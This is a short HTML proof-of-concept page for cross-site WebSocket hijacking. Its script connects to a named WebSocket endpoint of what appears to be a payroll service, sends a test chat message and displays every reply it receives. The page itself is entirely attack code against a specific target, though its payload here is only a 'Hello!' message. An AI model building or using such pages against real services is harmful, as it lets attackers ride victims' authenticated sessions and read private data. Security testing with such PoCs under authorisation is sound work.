<!DOCTYPE html>
<html>
<head>
  <title>WebSocket Hijack PoC</title>
</head>
<body>
  <h2>WebSocket Hijacking PoC</h2>
  <pre id="log"></pre>

  <script>
    function log(msg) {
      document.getElementById("log").textContent += msg + "\n";
    }

    // Target WebSocket (replace with actual endpoint)
    const wsUrl = "wss://penny.payroll.amazon.dev/prod";

    // Try connecting
    let ws = new WebSocket(wsUrl);

    ws.onopen = () => {
      log("[*] Connection opened");

      // Example message
      const payload = {
        action: "chat",
        messageType: "TEXT",
        message: "Hello!"
      };

      ws.send(JSON.stringify(payload));
      log("[*] Sent test message");
    };

    ws.onmessage = (event) => {
      log("[*] Received: " + event.data);
    };

    ws.onerror = (event) => {
      log("[!] WebSocket error: " + JSON.stringify(event));
    };

    ws.onclose = (event) => {
      log(`[!] Connection closed. Code: ${event.code}, Reason: ${event.reason}`);
    };
  </script>
</body>
</html>
